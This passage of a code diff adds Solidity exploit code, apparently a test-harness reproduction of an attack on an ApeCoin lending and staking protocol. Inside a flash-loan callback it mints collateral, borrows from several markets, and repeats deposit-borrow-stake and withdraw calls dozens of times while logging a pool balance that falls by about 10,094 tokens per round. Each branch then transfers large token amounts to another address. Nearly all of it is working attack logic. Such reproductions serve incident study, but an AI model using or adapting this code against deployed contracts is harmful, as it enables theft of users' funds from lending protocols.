+                S4[] memory arr384 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s145, s245, arr383, arr384);
+
+                S3 memory s3206 = S3(9829, 4347682165404022135955);
+                S3[] memory arr392 = new S3[](1);
+                arr392[0] = s3206;
+                S5[] memory arr393 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr392, arr393);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v23 = 0;
+                uint256 v23 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", uint256(0));
+                // uint256 v24 = 206227682165404022135955;
+                uint256 v24 = I(x4d22).balanceOf(r);
+                console2.log("I(x4d22).balanceOf(r)\t\t->", "206227682165404022135955 (206227.6821 ether)");
+                I(x4d22).transfer(xac4b, 200600000000000000000000);
+            }
+            return;
+        }
+        if (t_uniswapV3FlashCallback == 2) {
+            I(x4d22).approve(x7362, 130000000000000000000000);
+            I(x7362).mint(130000000000000000000000);
+            // uint256 v1 = 635137352249859;
+            uint256 v1 = I(x7362).balanceOf(r);
+            console2.log("I(x7362).balanceOf(r)\t\t->", uint256(635137352249859));
+            I(x7362).approve(x3b2d, v1);
+            I(x3b2d).mint(v1);
+            I(x7362).getCash();
+            xe46a = address(new Xe46a());
+            I(x0518).getAccountLiquidity(r);
+            I(x37b6).getCash();
+            I(x01b7).getUnderlyingPrice(x37b6);
+            I(x37b6).borrow(88438033874545690903);
+            I(x5954).pools(1);
+            I(x5954).getTimeRangeBy(1, 2);
+            // uint256 v2 = 130000000000000000000000;
+            uint256 v2 = I(x4d22).balanceOf(x5f0a);
+            console2.log("I(x4d22).balanceOf(x5f0a)\t->", "130000000000000000000000 (130000.0 ether)");
+
+            uint256[] memory arr407 = new uint256[](0);
+            uint256[] memory arr408 = new uint256[](0);
+            S1 memory s149 = S1(arr407, arr408);
+            S2 memory s249 = S2(xbc4c, 0, 0);
+            S3 memory s3211 = S3(9829, 10094000000000000000000);
+            S3[] memory arr409 = new S3[](1);
+            arr409[0] = s3211;
+            S4[] memory arr410 = new S4[](0);
+            I(x0b89).depositAndBorrowApeAndStake(s149, s249, arr409, arr410);
+
+            S3 memory s3216 = S3(9829, 10094000000000000000000);
+            S3[] memory arr418 = new S3[](1);
+            arr418[0] = s3216;
+            S5[] memory arr419 = new S5[](0);
+            I(x0b89).withdrawApeCoin(xbc4c, arr418, arr419);
+
+            I(x5954).pools(1);
+            I(x5954).getTimeRangeBy(1, 2);
+            // uint256 v3 = 119906000000000000000000;
+            uint256 v3 = I(x4d22).balanceOf(x5f0a);
+            console2.log("I(x4d22).balanceOf(x5f0a)\t->", "119906000000000000000000 (119906.0 ether)");
+
+            uint256[] memory arr425 = new uint256[](0);
+            uint256[] memory arr426 = new uint256[](0);
+            S1 memory s151 = S1(arr425, arr426);
+            S2 memory s251 = S2(xbc4c, 0, 0);
+            S3 memory s3221 = S3(9829, 10094000000000000000000);
+            S3[] memory arr427 = new S3[](1);
+            arr427[0] = s3221;
+            S4[] memory arr428 = new S4[](0);
+            I(x0b89).depositAndBorrowApeAndStake(s151, s251, arr427, arr428);
+
+            S3 memory s3226 = S3(9829, 10094000000000000000000);
+            S3[] memory arr436 = new S3[](1);
+            arr436[0] = s3226;
+            S5[] memory arr437 = new S5[](0);
+            I(x0b89).withdrawApeCoin(xbc4c, arr436, arr437);
+
+            I(x5954).pools(1);
+            I(x5954).getTimeRangeBy(1, 2);
+            // uint256 v4 = 109812000000000000000000;
+            uint256 v4 = I(x4d22).balanceOf(x5f0a);
+            console2.log("I(x4d22).balanceOf(x5f0a)\t->", "109812000000000000000000 (109812.0 ether)");
+
+            uint256[] memory arr443 = new uint256[](0);
+            uint256[] memory arr444 = new uint256[](0);
+            S1 memory s153 = S1(arr443, arr444);
+            S2 memory s253 = S2(xbc4c, 0, 0);
+            S3 memory s3231 = S3(9829, 10094000000000000000000);
+            S3[] memory arr445 = new S3[](1);
+            arr445[0] = s3231;
+            S4[] memory arr446 = new S4[](0);
+            I(x0b89).depositAndBorrowApeAndStake(s153, s253, arr445, arr446);
+
+            S3 memory s3236 = S3(9829, 10094000000000000000000);
+            S3[] memory arr454 = new S3[](1);
+            arr454[0] = s3236;
+            S5[] memory arr455 = new S5[](0);
+            I(x0b89).withdrawApeCoin(xbc4c, arr454, arr455);
+
+            I(x5954).pools(1);
+            I(x5954).getTimeRangeBy(1, 2);
+            // uint256 v5 = 99718000000000000000000;
+            uint256 v5 = I(x4d22).balanceOf(x5f0a);
+            console2.log("I(x4d22).balanceOf(x5f0a)\t->", "99718000000000000000000 (99718.0 ether)");
+
+            uint256[] memory arr461 = new uint256[](0);
+            uint256[] memory arr462 = new uint256[](0);
+            S1 memory s155 = S1(arr461, arr462);
+            S2 memory s255 = S2(xbc4c, 0, 0);
+            S3 memory s3241 = S3(9829, 10094000000000000000000);
+            S3[] memory arr463 = new S3[](1);
+            arr463[0] = s3241;
+            S4[] memory arr464 = new S4[](0);
+            I(x0b89).depositAndBorrowApeAndStake(s155, s255, arr463, arr464);
+
+            {
+
+                S3 memory s3246 = S3(9829, 10094000000000000000000);
+                S3[] memory arr472 = new S3[](1);
+                arr472[0] = s3246;
+                S5[] memory arr473 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr472, arr473);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v6 = 89624000000000000000000;
+                uint256 v6 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "89624000000000000000000 (89624.0 ether)");
+
+                uint256[] memory arr479 = new uint256[](0);
+                uint256[] memory arr480 = new uint256[](0);
+                S1 memory s157 = S1(arr479, arr480);
+                S2 memory s257 = S2(xbc4c, 0, 0);
+                S3 memory s3251 = S3(9829, 10094000000000000000000);
+                S3[] memory arr481 = new S3[](1);
+                arr481[0] = s3251;
+                S4[] memory arr482 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s157, s257, arr481, arr482);
+
+                S3 memory s3256 = S3(9829, 10094000000000000000000);
+                S3[] memory arr490 = new S3[](1);
+                arr490[0] = s3256;
+                S5[] memory arr491 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr490, arr491);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v7 = 79530000000000000000000;
+                uint256 v7 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "79530000000000000000000 (79530.0 ether)");
+
+                uint256[] memory arr497 = new uint256[](0);
+                uint256[] memory arr498 = new uint256[](0);
+                S1 memory s159 = S1(arr497, arr498);
+                S2 memory s259 = S2(xbc4c, 0, 0);
+                S3 memory s3261 = S3(9829, 10094000000000000000000);
+                S3[] memory arr499 = new S3[](1);
+                arr499[0] = s3261;
+                S4[] memory arr500 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s159, s259, arr499, arr500);
+
+                S3 memory s3266 = S3(9829, 10094000000000000000000);
+                S3[] memory arr508 = new S3[](1);
+                arr508[0] = s3266;
+                S5[] memory arr509 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr508, arr509);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v8 = 69436000000000000000000;
+                uint256 v8 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "69436000000000000000000 (69436.0 ether)");
+
+                uint256[] memory arr515 = new uint256[](0);
+                uint256[] memory arr516 = new uint256[](0);
+                S1 memory s161 = S1(arr515, arr516);
+                S2 memory s261 = S2(xbc4c, 0, 0);
+                S3 memory s3271 = S3(9829, 10094000000000000000000);
+                S3[] memory arr517 = new S3[](1);
+                arr517[0] = s3271;
+                S4[] memory arr518 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s161, s261, arr517, arr518);
+
+                S3 memory s3276 = S3(9829, 10094000000000000000000);
+                S3[] memory arr526 = new S3[](1);
+                arr526[0] = s3276;
+                S5[] memory arr527 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr526, arr527);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v9 = 59342000000000000000000;
+                uint256 v9 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "59342000000000000000000 (59342.0 ether)");
+
+                uint256[] memory arr533 = new uint256[](0);
+                uint256[] memory arr534 = new uint256[](0);
+                S1 memory s163 = S1(arr533, arr534);
+                S2 memory s263 = S2(xbc4c, 0, 0);
+                S3 memory s3281 = S3(9829, 10094000000000000000000);
+                S3[] memory arr535 = new S3[](1);
+                arr535[0] = s3281;
+                S4[] memory arr536 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s163, s263, arr535, arr536);
+
+                S3 memory s3286 = S3(9829, 10094000000000000000000);
+                S3[] memory arr544 = new S3[](1);
+                arr544[0] = s3286;
+                S5[] memory arr545 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr544, arr545);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v10 = 49248000000000000000000;
+                uint256 v10 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "49248000000000000000000 (49248.0 ether)");
+
+                uint256[] memory arr551 = new uint256[](0);
+                uint256[] memory arr552 = new uint256[](0);
+                S1 memory s165 = S1(arr551, arr552);
+                S2 memory s265 = S2(xbc4c, 0, 0);
+                S3 memory s3291 = S3(9829, 10094000000000000000000);
+                S3[] memory arr553 = new S3[](1);
+                arr553[0] = s3291;
+                S4[] memory arr554 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s165, s265, arr553, arr554);
+
+                S3 memory s3296 = S3(9829, 10094000000000000000000);
+                S3[] memory arr562 = new S3[](1);
+                arr562[0] = s3296;
+                S5[] memory arr563 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr562, arr563);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v11 = 39154000000000000000000;
+                uint256 v11 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "39154000000000000000000 (39154.0 ether)");
+
+                uint256[] memory arr569 = new uint256[](0);
+                uint256[] memory arr570 = new uint256[](0);
+                S1 memory s167 = S1(arr569, arr570);
+                S2 memory s267 = S2(xbc4c, 0, 0);
+                S3 memory s3301 = S3(9829, 10094000000000000000000);
+                S3[] memory arr571 = new S3[](1);
+                arr571[0] = s3301;
+                S4[] memory arr572 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s167, s267, arr571, arr572);
+            }
+            {
+
+                S3 memory s3306 = S3(9829, 10094000000000000000000);
+                S3[] memory arr580 = new S3[](1);
+                arr580[0] = s3306;
+                S5[] memory arr581 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr580, arr581);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v12 = 29060000000000000000000;
+                uint256 v12 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "29060000000000000000000 (29060.0 ether)");
+
+                uint256[] memory arr587 = new uint256[](0);
+                uint256[] memory arr588 = new uint256[](0);
+                S1 memory s169 = S1(arr587, arr588);
+                S2 memory s269 = S2(xbc4c, 0, 0);
+                S3 memory s3311 = S3(9829, 10094000000000000000000);
+                S3[] memory arr589 = new S3[](1);
+                arr589[0] = s3311;
+                S4[] memory arr590 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s169, s269, arr589, arr590);
+
+                S3 memory s3316 = S3(9829, 10094000000000000000000);
+                S3[] memory arr598 = new S3[](1);
+                arr598[0] = s3316;
+                S5[] memory arr599 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr598, arr599);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v13 = 18966000000000000000000;
+                uint256 v13 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "18966000000000000000000 (18966.0 ether)");
+
+                uint256[] memory arr605 = new uint256[](0);
+                uint256[] memory arr606 = new uint256[](0);
+                S1 memory s171 = S1(arr605, arr606);
+                S2 memory s271 = S2(xbc4c, 0, 0);
+                S3 memory s3321 = S3(9829, 10094000000000000000000);
+                S3[] memory arr607 = new S3[](1);
+                arr607[0] = s3321;
+                S4[] memory arr608 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s171, s271, arr607, arr608);
+
+                S3 memory s3326 = S3(9829, 10094000000000000000000);
+                S3[] memory arr616 = new S3[](1);
+                arr616[0] = s3326;
+                S5[] memory arr617 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr616, arr617);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v14 = 8872000000000000000000;
+                uint256 v14 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "8872000000000000000000 (8872.0 ether)");
+
+                uint256[] memory arr623 = new uint256[](0);
+                uint256[] memory arr624 = new uint256[](0);
+                S1 memory s173 = S1(arr623, arr624);
+                S2 memory s273 = S2(xbc4c, 0, 0);
+                S3 memory s3331 = S3(9829, 8872000000000000000000);
+                S3[] memory arr625 = new S3[](1);
+                arr625[0] = s3331;
+                S4[] memory arr626 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s173, s273, arr625, arr626);
+
+                S3 memory s3336 = S3(9829, 8872000000000000000000);
+                S3[] memory arr634 = new S3[](1);
+                arr634[0] = s3336;
+                S5[] memory arr635 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr634, arr635);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v15 = 0;
+                uint256 v15 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", uint256(0));
+                // uint256 v16 = 135627682165404022135955;
+                uint256 v16 = I(x4d22).balanceOf(r);
+                console2.log("I(x4d22).balanceOf(r)\t\t->", "135627682165404022135955 (135627.6821 ether)");
+                I(x4d22).transfer(xac4b, 130390000000000000000000);
+            }
+            return;
+        }
+        if (t_uniswapV3FlashCallback == 3) {
+            I(x4d22).approve(x7362, 220000000000000000000000);
+            I(x7362).mint(220000000000000000000000);
+            // uint256 v1 = 1074845519453938;
+            uint256 v1 = I(x7362).balanceOf(r);
+            console2.log("I(x7362).balanceOf(r)\t\t->", "1074845519453938 (0.1074 ether)");
+            I(x7362).approve(x3b2d, v1);
+            I(x3b2d).mint(v1);
+            I(x7362).getCash();
+            xeb52 = address(new Xeb52());
+            I(x0518).getAccountLiquidity(r);
+            I(x0b7d).getCash();
+            I(x01b7).getUnderlyingPrice(x0b7d);
+            I(x0b7d).borrow(102469546694);
+            I(x0518).getAccountLiquidity(r);
+            I(x6a55).getCash();
+            I(x01b7).getUnderlyingPrice(x6a55);
+            I(x6a55).borrow(700009900);
+            I(x5954).pools(1);
+            I(x5954).getTimeRangeBy(1, 2);
+            // uint256 v2 = 220000000000000000000000;
+            uint256 v2 = I(x4d22).balanceOf(x5f0a);
+            console2.log("I(x4d22).balanceOf(x5f0a)\t->", "220000000000000000000000 (220000.0 ether)");
+
+            uint256[] memory arr649 = new uint256[](0);
+            uint256[] memory arr650 = new uint256[](0);
+            S1 memory s177 = S1(arr649, arr650);
+            S2 memory s277 = S2(xbc4c, 0, 0);
+            S3 memory s3341 = S3(9829, 10094000000000000000000);
+            S3[] memory arr651 = new S3[](1);
+            arr651[0] = s3341;
+            S4[] memory arr652 = new S4[](0);
+            I(x0b89).depositAndBorrowApeAndStake(s177, s277, arr651, arr652);
+
+            S3 memory s3346 = S3(9829, 10094000000000000000000);
+            S3[] memory arr660 = new S3[](1);
+            arr660[0] = s3346;
+            S5[] memory arr661 = new S5[](0);
+            I(x0b89).withdrawApeCoin(xbc4c, arr660, arr661);
+
+            I(x5954).pools(1);
+            I(x5954).getTimeRangeBy(1, 2);
+            // uint256 v3 = 209906000000000000000000;
+            uint256 v3 = I(x4d22).balanceOf(x5f0a);
+            console2.log("I(x4d22).balanceOf(x5f0a)\t->", "209906000000000000000000 (209906.0 ether)");
+
+            uint256[] memory arr667 = new uint256[](0);
+            uint256[] memory arr668 = new uint256[](0);
+            S1 memory s179 = S1(arr667, arr668);
+            S2 memory s279 = S2(xbc4c, 0, 0);
+            S3 memory s3351 = S3(9829, 10094000000000000000000);
+            S3[] memory arr669 = new S3[](1);
+            arr669[0] = s3351;
+            S4[] memory arr670 = new S4[](0);
+            I(x0b89).depositAndBorrowApeAndStake(s179, s279, arr669, arr670);
+
+            S3 memory s3356 = S3(9829, 10094000000000000000000);
+            S3[] memory arr678 = new S3[](1);
+            arr678[0] = s3356;
+            S5[] memory arr679 = new S5[](0);
+            I(x0b89).withdrawApeCoin(xbc4c, arr678, arr679);
+
+            I(x5954).pools(1);
+            I(x5954).getTimeRangeBy(1, 2);
+            // uint256 v4 = 199812000000000000000000;
+            uint256 v4 = I(x4d22).balanceOf(x5f0a);
+            console2.log("I(x4d22).balanceOf(x5f0a)\t->", "199812000000000000000000 (199812.0 ether)");
+
+            uint256[] memory arr685 = new uint256[](0);
+            uint256[] memory arr686 = new uint256[](0);
+            S1 memory s181 = S1(arr685, arr686);
+            S2 memory s281 = S2(xbc4c, 0, 0);
+            S3 memory s3361 = S3(9829, 10094000000000000000000);
+            S3[] memory arr687 = new S3[](1);
+            arr687[0] = s3361;
+            S4[] memory arr688 = new S4[](0);
+            I(x0b89).depositAndBorrowApeAndStake(s181, s281, arr687, arr688);
+
+            S3 memory s3366 = S3(9829, 10094000000000000000000);
+            S3[] memory arr696 = new S3[](1);
+            arr696[0] = s3366;
+            S5[] memory arr697 = new S5[](0);
+            I(x0b89).withdrawApeCoin(xbc4c, arr696, arr697);
+
+            {
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v5 = 189718000000000000000000;
+                uint256 v5 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "189718000000000000000000 (189718.0 ether)");
+
+                uint256[] memory arr703 = new uint256[](0);
+                uint256[] memory arr704 = new uint256[](0);
+                S1 memory s183 = S1(arr703, arr704);
+                S2 memory s283 = S2(xbc4c, 0, 0);
+                S3 memory s3371 = S3(9829, 10094000000000000000000);
+                S3[] memory arr705 = new S3[](1);
+                arr705[0] = s3371;
+                S4[] memory arr706 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s183, s283, arr705, arr706);
+
+                S3 memory s3376 = S3(9829, 10094000000000000000000);
+                S3[] memory arr714 = new S3[](1);
+                arr714[0] = s3376;
+                S5[] memory arr715 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr714, arr715);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v6 = 179624000000000000000000;
+                uint256 v6 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "179624000000000000000000 (179624.0 ether)");
+
+                uint256[] memory arr721 = new uint256[](0);
+                uint256[] memory arr722 = new uint256[](0);
+                S1 memory s185 = S1(arr721, arr722);
+                S2 memory s285 = S2(xbc4c, 0, 0);
+                S3 memory s3381 = S3(9829, 10094000000000000000000);
+                S3[] memory arr723 = new S3[](1);
+                arr723[0] = s3381;
+                S4[] memory arr724 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s185, s285, arr723, arr724);
+
+                S3 memory s3386 = S3(9829, 10094000000000000000000);
+                S3[] memory arr732 = new S3[](1);
+                arr732[0] = s3386;
+                S5[] memory arr733 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr732, arr733);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v7 = 169530000000000000000000;
+                uint256 v7 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "169530000000000000000000 (169530.0 ether)");
+
+                uint256[] memory arr739 = new uint256[](0);
+                uint256[] memory arr740 = new uint256[](0);
+                S1 memory s187 = S1(arr739, arr740);
+                S2 memory s287 = S2(xbc4c, 0, 0);
+                S3 memory s3391 = S3(9829, 10094000000000000000000);
+                S3[] memory arr741 = new S3[](1);
+                arr741[0] = s3391;
+                S4[] memory arr742 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s187, s287, arr741, arr742);
+
+                S3 memory s3396 = S3(9829, 10094000000000000000000);
+                S3[] memory arr750 = new S3[](1);
+                arr750[0] = s3396;
+                S5[] memory arr751 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr750, arr751);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v8 = 159436000000000000000000;
+                uint256 v8 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "159436000000000000000000 (159436.0 ether)");
+
+                uint256[] memory arr757 = new uint256[](0);
+                uint256[] memory arr758 = new uint256[](0);
+                S1 memory s189 = S1(arr757, arr758);
+                S2 memory s289 = S2(xbc4c, 0, 0);
+                S3 memory s3401 = S3(9829, 10094000000000000000000);
+                S3[] memory arr759 = new S3[](1);
+                arr759[0] = s3401;
+                S4[] memory arr760 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s189, s289, arr759, arr760);
+
+                S3 memory s3406 = S3(9829, 10094000000000000000000);
+                S3[] memory arr768 = new S3[](1);
+                arr768[0] = s3406;
+                S5[] memory arr769 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr768, arr769);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v9 = 149342000000000000000000;
+                uint256 v9 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "149342000000000000000000 (149342.0 ether)");
+
+                uint256[] memory arr775 = new uint256[](0);
+                uint256[] memory arr776 = new uint256[](0);
+                S1 memory s191 = S1(arr775, arr776);
+                S2 memory s291 = S2(xbc4c, 0, 0);
+                S3 memory s3411 = S3(9829, 10094000000000000000000);
+                S3[] memory arr777 = new S3[](1);
+                arr777[0] = s3411;
+                S4[] memory arr778 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s191, s291, arr777, arr778);
+
+                S3 memory s3416 = S3(9829, 10094000000000000000000);
+                S3[] memory arr786 = new S3[](1);
+                arr786[0] = s3416;
+                S5[] memory arr787 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr786, arr787);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v10 = 139248000000000000000000;
+                uint256 v10 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "139248000000000000000000 (139248.0 ether)");
+
+                uint256[] memory arr793 = new uint256[](0);
+                uint256[] memory arr794 = new uint256[](0);
+                S1 memory s193 = S1(arr793, arr794);
+                S2 memory s293 = S2(xbc4c, 0, 0);
+                S3 memory s3421 = S3(9829, 10094000000000000000000);
+                S3[] memory arr795 = new S3[](1);
+                arr795[0] = s3421;
+                S4[] memory arr796 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s193, s293, arr795, arr796);
+
+                S3 memory s3426 = S3(9829, 10094000000000000000000);
+                S3[] memory arr804 = new S3[](1);
+                arr804[0] = s3426;
+                S5[] memory arr805 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr804, arr805);
+            }
+            {
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v11 = 129154000000000000000000;
+                uint256 v11 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "129154000000000000000000 (129154.0 ether)");
+
+                uint256[] memory arr811 = new uint256[](0);
+                uint256[] memory arr812 = new uint256[](0);
+                S1 memory s195 = S1(arr811, arr812);
+                S2 memory s295 = S2(xbc4c, 0, 0);
+                S3 memory s3431 = S3(9829, 10094000000000000000000);
+                S3[] memory arr813 = new S3[](1);
+                arr813[0] = s3431;
+                S4[] memory arr814 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s195, s295, arr813, arr814);
+
+                S3 memory s3436 = S3(9829, 10094000000000000000000);
+                S3[] memory arr822 = new S3[](1);
+                arr822[0] = s3436;
+                S5[] memory arr823 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr822, arr823);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v12 = 119060000000000000000000;
+                uint256 v12 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "119060000000000000000000 (119060.0 ether)");
+
+                uint256[] memory arr829 = new uint256[](0);
+                uint256[] memory arr830 = new uint256[](0);
+                S1 memory s197 = S1(arr829, arr830);
+                S2 memory s297 = S2(xbc4c, 0, 0);
+                S3 memory s3441 = S3(9829, 10094000000000000000000);
+                S3[] memory arr831 = new S3[](1);
+                arr831[0] = s3441;
+                S4[] memory arr832 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s197, s297, arr831, arr832);
+
+                S3 memory s3446 = S3(9829, 10094000000000000000000);
+                S3[] memory arr840 = new S3[](1);
+                arr840[0] = s3446;
+                S5[] memory arr841 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr840, arr841);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v13 = 108966000000000000000000;
+                uint256 v13 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "108966000000000000000000 (108966.0 ether)");
+
+                uint256[] memory arr847 = new uint256[](0);
+                uint256[] memory arr848 = new uint256[](0);
+                S1 memory s199 = S1(arr847, arr848);
+                S2 memory s299 = S2(xbc4c, 0, 0);
+                S3 memory s3451 = S3(9829, 10094000000000000000000);
+                S3[] memory arr849 = new S3[](1);
+                arr849[0] = s3451;
+                S4[] memory arr850 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s199, s299, arr849, arr850);
+
+                S3 memory s3456 = S3(9829, 10094000000000000000000);
+                S3[] memory arr858 = new S3[](1);
+                arr858[0] = s3456;
+                S5[] memory arr859 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr858, arr859);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v14 = 98872000000000000000000;
+                uint256 v14 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "98872000000000000000000 (98872.0 ether)");
+
+                uint256[] memory arr865 = new uint256[](0);
+                uint256[] memory arr866 = new uint256[](0);
+                S1 memory s1101 = S1(arr865, arr866);
+                S2 memory s2101 = S2(xbc4c, 0, 0);
+                S3 memory s3461 = S3(9829, 10094000000000000000000);
+                S3[] memory arr867 = new S3[](1);
+                arr867[0] = s3461;
+                S4[] memory arr868 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s1101, s2101, arr867, arr868);
+
+                S3 memory s3466 = S3(9829, 10094000000000000000000);
+                S3[] memory arr876 = new S3[](1);
+                arr876[0] = s3466;
+                S5[] memory arr877 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr876, arr877);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v15 = 88778000000000000000000;
+                uint256 v15 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "88778000000000000000000 (88778.0 ether)");
+
+                uint256[] memory arr883 = new uint256[](0);
+                uint256[] memory arr884 = new uint256[](0);
+                S1 memory s1103 = S1(arr883, arr884);
+                S2 memory s2103 = S2(xbc4c, 0, 0);
+                S3 memory s3471 = S3(9829, 10094000000000000000000);
+                S3[] memory arr885 = new S3[](1);
+                arr885[0] = s3471;
+                S4[] memory arr886 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s1103, s2103, arr885, arr886);
+
+                S3 memory s3476 = S3(9829, 10094000000000000000000);
+                S3[] memory arr894 = new S3[](1);
+                arr894[0] = s3476;
+                S5[] memory arr895 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr894, arr895);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v16 = 78684000000000000000000;
+                uint256 v16 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "78684000000000000000000 (78684.0 ether)");
+
+                uint256[] memory arr901 = new uint256[](0);
+                uint256[] memory arr902 = new uint256[](0);
+                S1 memory s1105 = S1(arr901, arr902);
+                S2 memory s2105 = S2(xbc4c, 0, 0);
+                S3 memory s3481 = S3(9829, 10094000000000000000000);
+                S3[] memory arr903 = new S3[](1);
+                arr903[0] = s3481;
+                S4[] memory arr904 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s1105, s2105, arr903, arr904);
+
+                S3 memory s3486 = S3(9829, 10094000000000000000000);
+                S3[] memory arr912 = new S3[](1);
+                arr912[0] = s3486;
